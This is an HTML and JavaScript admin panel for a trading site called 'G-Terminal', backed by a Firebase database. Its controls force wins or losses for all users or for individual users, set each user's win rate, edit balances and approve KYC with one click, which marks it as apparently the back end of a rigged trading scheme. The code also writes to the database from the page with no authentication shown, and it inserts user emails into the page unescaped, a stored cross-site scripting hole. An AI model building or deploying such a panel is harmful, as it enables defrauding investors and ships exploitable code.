<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>G-Terminal | Admin Panel</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <style>
        body { background: #0b0e11; color: white; font-family: sans-serif; padding: 20px; }
        .card { background: #1e2329; padding: 20px; border-radius: 15px; margin-bottom: 20px; border: 1px solid #333; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .win { background: #0ecb81; color: white; } .loss { background: #f6465d; color: white; }
        input { background: #2b3139; color: white; border: 1px solid #444; padding: 5px; width: 60px; }
    </style>
</head>
<body>

    <div class="card">
        <h2>🌍 GLOBAL MARKET OVERRIDE</h2>
        <button class="btn win" onclick="setG('WIN')">FORCE WIN ALL</button>
        <button class="btn" style="background:#555; color:white;" onclick="setG('NORMAL')">RESET NORMAL</button>
        <button class="btn loss" onclick="setG('LOSS')">FORCE LOSS ALL</button>
    </div>

    <div class="card">
        <h2>MANAGE USERS</h2>
        <table>
            <thead><tr><th>User Email</th><th>Balance</th><th>Win Rate %</th><th>Control</th><th>KYC</th></tr></thead>
            <tbody id="user-list"></tbody>
        </table>
    </div>

<script>
    firebase.initializeApp({ databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com" });
    const db = firebase.database();

    function setG(v) { db.ref('settings/globalControl').set(v); alert("Global: " + v); }

    db.ref('users').on('value', snap => {
        const list = document.getElementById('user-list');
        list.innerHTML = "";
        snap.forEach(child => {
            const u = child.val();
            const uid = child.key;
            list.innerHTML += `
                <tr>
                    <td>${u.email}</td>
                    <td><input type="number" value="${u.balance}" onchange="db.ref('users/${uid}/balance').set(parseFloat(this.value))"></td>
                    <td><input type="number" value="${u.winRate || 50}" onchange="db.ref('users/${uid}/winRate').set(parseInt(this.value))"> %</td>
                    <td>
                        <button class="win" onclick="db.ref('users/${uid}/control').set('WIN')">W</button>
                        <button class="loss" onclick="db.ref('users/${uid}/control').set('LOSS')">L</button>
                    </td>
                    <td><button onclick="db.ref('users/${uid}/kyc_status').set('APPROVED')">Approve</button></td>
                </tr>`;
        });
    });
</script>
</body>
</html>
